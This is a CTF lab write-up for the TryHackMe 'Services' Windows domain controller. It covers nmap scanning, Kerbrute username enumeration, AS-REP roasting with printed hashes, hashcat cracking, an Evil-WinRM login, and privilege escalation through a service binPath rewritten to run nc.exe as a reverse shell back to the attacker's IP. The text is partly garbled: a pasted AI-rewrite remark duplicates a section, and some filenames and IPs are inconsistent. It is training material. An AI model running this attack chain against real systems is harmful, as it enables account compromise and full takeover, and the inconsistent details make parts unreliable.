THM CTF - Services WriteUp

Creating an enviornment variable with the ip address of the target server.

```
$ export IP=10.10.14.31
```

**Using Nmap to Identify Service Versions and Gather Additional Information:**

To discover the services running on open ports and gather more information using default scripts, I used the following Nmap command:

```
$ nmap -sC -sV $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 20:18 BST
Nmap scan report for 10.10.14.31
Host is up (0.15s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Above Services
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-07 19:18:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SERVICES
|   NetBIOS_Domain_Name: SERVICES
|   NetBIOS_Computer_Name: WIN-SERVICES
|   DNS_Domain_Name: services.local
|   DNS_Computer_Name: WIN-SERVICES.services.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-07T19:18:38+00:00
|_ssl-date: 2024-10-07T19:18:46+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=WIN-SERVICES.services.local
| Not valid before: 2024-10-06T19:10:59
|_Not valid after:  2025-04-07T19:10:59
Service Info: Host: WIN-SERVICES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-07T19:18:41
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.47 seconds                                                                                                                                                                  
```

**Key Findings:**

    53/tcp (DNS - Simple DNS Plus): DNS service may be vulnerable to zone transfer attacks.
    80/tcp (HTTP - Microsoft IIS 10.0): IIS web service with TRACE method enabled, posing a potential XST risk.
    88/tcp (Kerberos): Kerberos service running, possibly exploitable for attacks like Kerberoasting.
    135/tcp (MSRPC): Microsoft RPC service, often vulnerable to remote management attacks.
    139/tcp (NetBIOS-SSN): NetBIOS for file sharing; may expose resources if misconfigured.
    389/tcp (LDAP): Exposed LDAP service could allow Active Directory enumeration.
    445/tcp (SMB - Microsoft-ds): SMB may be vulnerable to share enumeration or other attacks.
    464/tcp (kpasswd5): Kerberos password change service, linked to Active Directory.
    593/tcp (RPC over HTTP): Used for remote administration, potentially vulnerable.
    3268/tcp & 3269/tcp (LDAP - Global Catalog): Global Catalog for querying across AD domains.
    3389/tcp (RDP): RDP service may be exploited for remote access via weak credentials or known vulnerabilities.

During my investigation, I discovered a pattern for constructing user email addresses within the organization: <firstLetterOfFirstName>.<lastname>@services.local. This insight enabled me to compile a list of potential user accounts based on the staff members displayed on the organization's website. Below is the constructed list of usernames:

    j.rock for Joanne Doe
    j.rock for Jack Rock
    w.masters for Will Masters
    j.larusso for Johnny LaRusso

I saved these usernames to a text file for further analysis.

**Validating Usernames with Kerbrute**

The next step was to verify the validity of these usernames using Kerbrute. I executed the following command:

```
./kerbrute_linux_amd64 userenum -d services.local users.txt --dc 10.10.160.39

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/08/24 - Ronnie Flathers @ropnop

2024/10/08 18:27:31 >  Using KDC(s):
2024/10/08 18:27:31 >   10.10.160.39:88

2024/10/08 18:27:31 >  [+] VALID USERNAME:       j.larusso@services.local
2024/10/08 18:27:31 >  [+] VALID USERNAME:       w.masters@services.local
2024/10/08 18:27:32 >  [+] VALID USERNAME:       j.rock@services.local
2024/10/08 18:27:32 >  [+] VALID USERNAME:       j.rock@services.local
2024/10/08 18:27:32 >  Done! Tested 4 usernames (4 valid) in 1.342 seconds

```
Here's an improved version of your GitHub write-up, structured for clarity and professionalism while maintaining the essential details of your findings and actions:
User Enumeration and Validating Credentials

During my investigation, I discovered a pattern for constructing user email addresses within the organization: <firstLetterOfFirstName>.<lastname>@services.local. This insight enabled me to compile a list of potential user accounts based on the staff members displayed on the organization's website. Below is the constructed list of usernames:

    j.rock for Joanne Doe
    j.rock for Jack Rock
    w.masters for Will Masters
    j.larusso for Johnny LaRusso

I saved these usernames to a text file for further analysis.
Validating Usernames with Kerbrute

The next step was to verify the validity of these usernames using Kerbrute. I executed the following command:

bash

./kerbrute_linux_amd64 userenum -d services.local users.txt --dc 10.10.160.39

Kerbrute Output:

typescript

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/08/24 - Ronnie Flathers @ropnop

2024/10/08 18:27:31 >  Using KDC(s):
2024/10/08 18:27:31 >   10.10.160.39:88

2024/10/08 18:27:31 >  [+] VALID USERNAME:       j.larusso@services.local
2024/10/08 18:27:31 >  [+] VALID USERNAME:       w.masters@services.local
2024/10/08 18:27:32 >  [+] VALID USERNAME:       j.rock@services.local
2024/10/08 18:27:32 >  [+] VALID USERNAME:       j.rock@services.local
2024/10/08 18:27:32 >  Done! Tested 4 usernames (4 valid) in 1.342 seconds

All four usernames were confirmed as valid.
Retrieving Kerberos AS-REP Hashes

Subsequently, I utilized GetNPUsers.py to query the domain controller for any users lacking the necessary flag for 
pre-authentication.
This allowed me to retrieve the Kerberos AS-REP (Authentication Service Response) hashes for the valid users. 

The command I ran was:

```
sudo ./GetNPUsers.py -dc-ip 10.10.160.39 -request 'services.local/' -usersfile /home/andrepaiva/users.txt -format hashcat 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

$krb5asrep$23$j.rock@SERVICES.LOCAL:2604b6f37de5269ca3be902a30424655$0607d6ebbf4ceab95a764b1c130fbc1d680b0dbab54db508532913c65c4cfa1654bd23a7e3f76613f6cf58e630becfbbfa248b314ab33d17f07d106ceef5c00dbb8c385ecc99382c4238fc5d4afbeca447b5faa3c2cffdcaad2816f4ea6d8675fe484ac677473b711b253c2bea517c6eed5a8de3b4c8a48ea1a2d683746df67de8fd8f2aa9d6074d140f89cabfbe74a46aba4d46dc7f4b03cf4b833239fd45c68957126cacaea22057a6a220a375219436f2ca0b8b2531468e989e1168738d09905523991489bffa7bee7306ab6bac4498063f2b2c7f44a67401590c0ed677c77836281a5a918312c34f7668d7f3a3d9
$krb5asrep$23$j.rock@SERVICES.LOCAL:e10c9deff09d5d95e0e596a390c6bb67$521be42f3d1d4f4c91e9ea1dcfdc6d2aab13b6eff01ef8c3484a8c59734814e6ced04708f67d0bfb0bed727f41e73f1182ff7581231e5a0eb118bdcf633ac31aa8db09d2bc622582b3dbb26b6bdfa0adc47bd17f88e320575988fe91f90c71f7587ad86ca01067d4e1eec457a1e1f261c0f082a239438fe772c1506a2691177e9fa774a564069ab3e586d1d6fd373a29854a891eba66dd301cf4a077682ee01eb207837a5d2599447dfa659e3c027d4238840f40f12aac38b5961194c7df0ba0d3e5c216ddd43d6c3f52433104c809ff64de2bdfe860c54a4289c7dcefabba15ac6ac07de21c733c2fc74df0e63f70c6
[-] User w.masters doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.larusso doesn't have UF_DONT_REQUIRE_PREAUTH set

```

After successfully retrieving a Kerberos hash, I was able to crack it using Hashcat with the following command:

```
$ hashcat -m 18200 -a 0 -o hashes.txt /usr/share/wordlists/rockyou.txt -v 
hashcat (v6.2.6) starting
```
Upon completing the cracking process, I discovered that the password for the user j.rock is Serviceworks1.

With this information, I used Evil-WinRM to gain access to the target machine by executing the following command:

```
$ evil-winrm -i 10.10.17.164 -u 'j.rock' -p Serviceworks1 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\j.rock\Documents> 
```

Once logged in, I was able to retrieve the user flag:

```
*Evil-WinRM* PS C:\Users\j.rock\Desktop> type user.txt
THM{ASr3p_R0aSt1n6}

```

**Privilege Escalation**

To check for privilege escalation oportunities, I ran the following command:

```
$ whoami /all
USER INFORMATION
----------------

User Name       SID
=============== ============================================
services\j.rock S-1-5-21-1966530601-3185510712-10604624-1111


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                    Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeSystemtimePrivilege         Change the system time              Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

```

The user is part of the Server Operators Group.

The Server Operators group stands out because its members have elevated privileges, such as the ability to modify service 
configurations, including changing the binary path and starting or stopping services. 

These privileges can be exploited by an attacker to escalate their access, potentially leading to system-level control.



```

```

Uploading the nc.exe executable 

```
*Evil-WinRM* PS C:\Users\j.rock\Documents> upload /home/andrepaiva/nc.exe
                                        
Info: Uploading /home/andrepaiva/shell.exe to C:\Users\j.rock\Documents\shell.exe
                                        
Data: 9556 bytes of 9556 bytes copied
                                        
Info: Upload successful!

```

Seting up an netcat listener of my machine.

```
$ nc -lvp 4444
```

Changing the binary path of the AmazonSSMAgent service.

```
*Evil-WinRM* PS C:\Users\j.rock\Documents> sc.exe config cfn-hup binPath="C:\Users\j.rock\Documents\nc.exe -e 10.10.106.26 4444"
[SC] ChangeServiceConfig SUCCESS
```

Stopped and restarted the service

System privileges gained:

```└─$ nc -lvp 4444 
listening on [any] 4444 ...
10.10.248.137: inverse host lookup failed: Unknown host
connect to [10.11.106.26] from (UNKNOWN) [10.10.248.137] 50991
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

```















































